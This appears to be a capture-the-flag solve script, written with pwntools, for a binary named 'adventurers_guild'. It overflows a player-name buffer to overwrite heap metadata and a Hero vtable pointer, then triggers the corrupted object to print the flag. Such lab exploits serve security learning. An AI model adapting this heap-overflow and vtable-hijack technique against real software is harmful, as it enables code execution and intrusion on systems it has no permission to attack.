from pwn import *

HOST = "localhost"
PORT = 1337
FLAG_FORMAT = b"STF22{\w+}"

elf = context.binary = ELF("./adventurers_guild")
elf.symbols["Hero_vtable"] = 0x407D98

INPUT_PROMPT = b"=> "

if args.REMOTE:
    io = remote(HOST, PORT)
else:
    io = elf.process()


def create_player(name: bytes):
    io.sendlineafter(INPUT_PROMPT, b"1")
    io.sendlineafter(INPUT_PROMPT, name)


def edit_player_name(idx: int, new_name: bytes):
    io.sendlineafter(INPUT_PROMPT, b"2")
    io.sendlineafter(INPUT_PROMPT, str(idx).encode())
    io.sendlineafter(INPUT_PROMPT, new_name)


def take_quest():
    io.sendlineafter(INPUT_PROMPT, b"3")


create_player(b"A")
create_player(b"B")
edit_player_name(
    1,
    flat(
        {80: p64(0x61), 88: p64(elf.sym.Hero_vtable)},
        filler=p8(0xFF),
        length=80 + 8 + 8 + 80,
    ),
)

take_quest()

log.success(f"{io.recvline_regexS(FLAG_FORMAT).strip()}")

io.close()
